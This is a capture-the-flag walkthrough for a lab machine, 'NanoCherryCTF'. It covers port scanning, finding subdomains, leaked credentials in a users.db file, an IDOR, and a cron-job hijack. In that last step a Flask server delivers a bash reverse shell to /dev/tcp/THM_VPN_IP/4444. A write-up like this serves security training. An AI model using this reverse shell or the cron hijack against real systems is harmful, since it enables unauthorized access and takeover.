
# NanoCherryCTF Walkthrough

## Step 1: Update `/etc/hosts` and Read the Story

- **Method:** Go to the `/etc/hosts` file and add `TARGET_IP` next to `cherryontop.thm`.
- **Answer:** No answer needed.

---

## Step 2: Port Scanning

We perform a port scan to identify open ports and gather useful information:

```bash
nmap -sV [TARGET_MACHINE_IP] -T5
```

### Scan Results:

```
Starting Nmap 7.94SVN (https://nmap.org) at 2024-10-05 14:34 EEST
Nmap scan report for nano.cherryontop.thm (10.10.232.170)
Host is up (0.092s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Step 3: Directory Enumeration

We proceed with directory enumeration:

```bash
gobuster dir -u http://10.10.232.170 -w /usr/share/wordlists/dirb/big.txt
```

### Gobuster Scan Results:

```
/.htaccess (Status: 403) [Size: 278]
/.htpasswd (Status: 403) [Size: 278]
/css (Status: 301) [Size: 312] [--> http://10.10.232.170/css/]
/images (Status: 301) [Size: 315] [--> http://10.10.232.170/images/]
/jquery (Status: 301) [Size: 315] [--> http://10.10.232.170/jquery/]
/js (Status: 301) [Size: 311] [--> http://10.10.232.170/js/]
/server-status (Status: 403) [Size: 278]
```

No useful findings here.

---

## Step 4: SSH Login

Using the provided credentials, we connect via SSH:

```bash
ssh notsus@10.10.232.170
```

- **Password:** `dontbeascriptkiddie`

---

## Step 5: Check Users

After logging in and checking the home directory, we see four users:

```bash
notsus@nanocherryctf:/home$ ls
bob-boba  chad-cherry  molly-milk  sam-sprinkles
```

---

## Step 6: Find Subdomains

Since the server runs on Apache, we look for subdomains:

```bash
grep -iR ServerName /etc/apache2/sites-enabled/
```

### Results:

```
/etc/apache2/sites-enabled/a.cherryontop.thm.conf: ServerName cherryontop.thm
/etc/apache2/sites-enabled/b.cherryontop.thm.conf: ServerName nano.cherryontop.thm
```

We add `nano.cherryontop.thm` to `/etc/hosts` and access the page.

---

## Step 7: Admin Login

- We navigate to the `login.php` page, but no SQL injection vulnerabilities are found.
- We discover `/users.db`.

### Gobuster Results for `/users.db`:

```
/users.db (Status: 200) [Size: 12288]
/login.php (Status: 200) [Size: 2310]
```

By inspecting `/users.db`, we find credentials:

- **Username:** `puppet`
- **Password:** `master`

Using these, we log into the admin portal and find Molly's flag: **THM{B________1}**.

We also obtain Molly's SSH password.

---

## Step 8: Connect to Chad

After logging into SSH, we find `chads-key1.txt`:

```
chads-key1.txt: n________y
```

We visit `http://cherryontop.thm/content.php`, which is vulnerable to IDOR. After encoding users in base32, we uncover Sam's secret:

- **sam-sprinkles:** `S____________3`

After logging in as Sam, we find `chads-key2.txt`:

```
chads-key2.txt: w____3
```

---

## Step 9: Checking Cron Jobs

We check crontabs and find `bob-boba` running a cron job. It fetches a script from `cherryontop.tld:8000`.

We host a Flask server to serve the `coinflip.sh` script containing a reverse shell:

### `exploit.py`:

```python
from flask import Flask
app = Flask(__name__)

@app.route('/home/bob-boba/coinflip.sh')
def coinflip():
    return """#!/bin/bash
bash -c 'bash -i >& /dev/tcp/THM_VPN_IP/4444 0>&1'
"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

We also set up a listener.

---

## Step 10: Gaining Access

After gaining access to `bob-boba`, we find the last key:

```
chads-key3.txt: 7_______3
```

We log into SSH as `chad-cherry` and find Chad's flag:

- **THM{I_W_______T}**
